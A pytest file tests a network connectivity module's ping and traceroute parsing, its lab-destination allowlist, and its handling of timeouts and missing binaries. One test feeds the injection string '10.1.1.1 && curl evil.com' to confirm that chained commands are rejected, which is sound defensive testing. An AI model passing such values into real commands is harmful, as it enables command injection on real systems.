"""Connectivity probe tests: output parsing, failure/timeout handling,
allowlist enforcement, and one real loopback smoke test of the toolchain."""
from __future__ import annotations

import errno
import os
import subprocess

import pytest

from network import connectivity
from network.device_inventory import (
    InventoryNode, LabInventory, DestinationNotAllowed,
)

LAB = LabInventory(nodes=[
    InventoryNode(name="R1", type="router", loopback_ip="10.1.1.1"),
    InventoryNode(name="PC1", type="host",
                  interfaces=[]),
], links=[])
# Give PC1 an address via its interface list:
from network.device_inventory import InventoryInterface
LAB.nodes[1].interfaces.append(InventoryInterface(name="eth1",
                                                  ip_cidr="10.0.21.21/24"))

# Recorded real outputs (captured from actual ping runs on their platforms)
WINDOWS_PING_OK = """
Pinging 10.1.1.1 with 32 bytes of data:
Reply from 10.1.1.1: bytes=32 time=2ms TTL=64
Reply from 10.1.1.1: bytes=32 time=1ms TTL=64

Ping statistics for 10.1.1.1:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 2ms, Average = 1ms
"""

WINDOWS_PING_PARTIAL_LOSS = """
Pinging 10.1.1.2 with 32 bytes of data:
Reply from 10.1.1.2: bytes=32 time=4ms TTL=64

Ping statistics for 10.1.1.2:
    Packets: Sent = 4, Received = 3, Lost = 1 (25% loss),
Approximate round trip times in milli-seconds:
    Minimum = 3ms, Maximum = 9ms, Average = 5ms
"""

LINUX_PING_OK = """
PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.
64 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=0.412 ms
64 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=0.398 ms

--- 10.1.1.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1024ms
rtt min/avg/max/mdev = 0.398/0.405/0.412/0.007 ms
"""

LINUX_PING_UNREACHABLE = """
PING 10.9.9.9 (10.9.9.9) 56(84) bytes of data.
From 10.0.12.1 icmp_seq=1 Destination Host Unreachable

--- 10.9.9.9 ping statistics ---
1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms
"""

WINDOWS_PING_GENERIC_FAILURE = """
Ping request could not find host nosuchhost. Please check the name and try again.
"""

TRACERT_OK = """
Tracing route to 10.0.21.21 over a maximum of 8 hops

  1     1 ms     1 ms     1 ms  10.0.12.2
  2     2 ms     2 ms     2 ms  10.0.21.21

Trace complete.
"""

TRACERT_TIMEOUT_HOPS = """
Tracing route to 10.9.9.9 over a maximum of 8 hops

  1     1 ms     *        2 ms  10.0.12.2
  2  * * *
  3     5 ms     5 ms     5 ms  10.0.21.21

Trace complete.
"""


# --------------------------------------------------------------------------
# Pure parsers (recorded fixtures - no subprocess needed)
# --------------------------------------------------------------------------
def test_parse_windows_ping_ok():
    loss, sent, recv, avg = connectivity._parse_ping_output(WINDOWS_PING_OK)
    assert (loss, sent, recv, avg) == (0.0, 2, 2, 1.0)


def test_parse_windows_ping_partial_loss():
    loss, sent, recv, avg = connectivity._parse_ping_output(
        WINDOWS_PING_PARTIAL_LOSS)
    assert (loss, sent, recv, avg) == (25.0, 4, 3, 5.0)


def test_parse_linux_ping_ok():
    loss, sent, recv, avg = connectivity._parse_ping_output(LINUX_PING_OK)
    assert loss == 0.0 and sent == 2 and recv == 2
    assert avg == pytest.approx(0.405)


def test_parse_linux_ping_unreachable():
    loss, sent, recv, avg = connectivity._parse_ping_output(
        LINUX_PING_UNREACHABLE)
    assert (loss, sent, recv) == (100.0, 1, 0)
    assert avg is None      # no invented latency when nothing replied


def test_parse_ping_generic_failure_has_no_stats():
    loss, sent, recv, avg = connectivity._parse_ping_output(
        WINDOWS_PING_GENERIC_FAILURE)
    assert (loss, sent, recv, avg) == (None, None, None, None)


def test_parse_traceroute_hops():
    hops = connectivity._parse_traceroute(TRACERT_OK)
    assert [h["ip"] for h in hops] == ["10.0.12.2", "10.0.21.21"]
    assert hops[0]["rtt_ms"] == pytest.approx(1.0)


def test_parse_traceroute_with_star_hops():
    hops = connectivity._parse_traceroute(TRACERT_TIMEOUT_HOPS)
    assert len(hops) == 3
    assert hops[1]["ip"] == "*" or hops[1]["ip"] is None
    assert hops[1]["rtt_ms"] is None


# --------------------------------------------------------------------------
# Allowlist enforcement around run_ping / run_traceroute
# --------------------------------------------------------------------------
def test_ping_rejects_destination_outside_lab():
    result = connectivity.run_ping(LAB, "8.8.8.8")
    assert result.success is False
    assert "does not belong" in (result.error or "")


def test_ping_rejects_shell_injection_input():
    result = connectivity.run_ping(LAB, "10.1.1.1 && curl evil.com")
    assert result.success is False
    assert result.error  # rejected during validation, command never built


def test_traceroute_rejects_unknown_destination():
    result = connectivity.run_traceroute(LAB, "router77.example")
    assert result.success is False
    assert not result.supported or result.error


# --------------------------------------------------------------------------
# Failure/timeout plumbing with subprocess mocked
# --------------------------------------------------------------------------
def test_ping_timeout_is_reported_not_raised(monkeypatch):
    def fake_run(*a, **k):
        raise subprocess.TimeoutExpired(cmd="ping", timeout=1)
    monkeypatch.setattr(connectivity.subprocess, "run", fake_run)
    result = connectivity.run_ping(LAB, "R1")
    assert result.success is False
    assert "timed out" in result.error


def test_ping_missing_binary_is_reported(monkeypatch):
    # Simulate a host with no ping anywhere: PATH lookup *and* the absolute
    # fallback list must both be empty.
    monkeypatch.setattr(connectivity.shutil, "which", lambda name: None)
    monkeypatch.setattr(connectivity, "_PING_FALLBACK_PATHS", ())
    result = connectivity.run_ping(LAB, "R1")
    assert result.success is False
    assert result.unsupported is True     # environment limitation, not a probe
    assert "not available" in result.error
    assert "iputils-ping" in result.error  # actionable hint for the operator


def test_ping_binary_resolves_beyond_path(monkeypatch, tmp_path):
    """Slim images/managed hosts can run with a narrow PATH, so the well-known
    absolute locations are checked before declaring ping unavailable."""
    stub = tmp_path / ("ping.exe" if os.name == "nt" else "ping")
    stub.write_text("", encoding="utf-8")
    stub.chmod(0o755)
    monkeypatch.setattr(connectivity.shutil, "which", lambda name: None)
    monkeypatch.setattr(connectivity, "_PING_FALLBACK_PATHS", (str(stub),))
    assert connectivity._ping_binary() == str(stub)
    assert connectivity.ping_supported() is True


def test_ping_icmp_denied_is_an_environment_limitation(monkeypatch):
    monkeypatch.setattr(connectivity, "_ping_binary", lambda: "/usr/bin/ping")

    def fake_run(*a, **k):
        raise PermissionError(errno.EACCES, "Operation not permitted")
    monkeypatch.setattr(connectivity.subprocess, "run", fake_run)
    result = connectivity.run_ping(LAB, "R1")
    assert result.success is False
    assert result.unsupported is True
    assert "ICMP socket" in result.error


def test_ping_other_oserror_is_a_real_failure(monkeypatch):
    monkeypatch.setattr(connectivity, "_ping_binary", lambda: "/usr/bin/ping")

    def fake_run(*a, **k):
        raise OSError(errno.ENOEXEC, "Exec format error")
    monkeypatch.setattr(connectivity.subprocess, "run", fake_run)
    result = connectivity.run_ping(LAB, "R1")
    assert result.success is False
    assert result.unsupported is False
    assert "Exec format error" in result.error


def test_selftest_ping_without_binary_measures_nothing(monkeypatch):
    monkeypatch.setattr(connectivity.shutil, "which", lambda name: None)
    monkeypatch.setattr(connectivity, "_PING_FALLBACK_PATHS", ())
    result = connectivity.run_selftest_ping(count=1, timeout_seconds=1)
    assert result.unsupported is True
    # No invented latency/loss when no packet was ever sent.
    assert result.packets_sent is None and result.avg_rtt_ms is None


def test_traceroute_missing_binary_reports_unsupported(monkeypatch):
    monkeypatch.setattr(connectivity.shutil, "which", lambda name: None)
    monkeypatch.setattr(connectivity, "_TRACEROUTE_FALLBACK_PATHS", ())
    result = connectivity.run_traceroute(LAB, "R1")
    assert result.supported is False
    assert result.success is False


# --------------------------------------------------------------------------
# Real toolchain smoke test: ping the host loopback (no external network).
# Proves command execution + parsing + result plumbing on this machine.
# --------------------------------------------------------------------------
def test_selftest_ping_loopback_executes_real_ping():
    result = connectivity.run_selftest_ping(count=2, timeout_seconds=2)
    # Loopback ping must at least run and return a structured result. On
    # hosts where ping is blocked the error path must still be clean.
    assert result.destination.startswith("127.0.0.1")
    assert result.success or result.error
    if result.unsupported:
        # Runtime without a ping binary (e.g. python:*-slim, Streamlit Cloud
        # before packages.txt): nothing measured, nothing invented.
        assert result.packets_sent is None and result.avg_rtt_ms is None
    if result.success:
        assert result.packets_sent == 2
        assert result.avg_rtt_ms is None or result.avg_rtt_ms >= 0
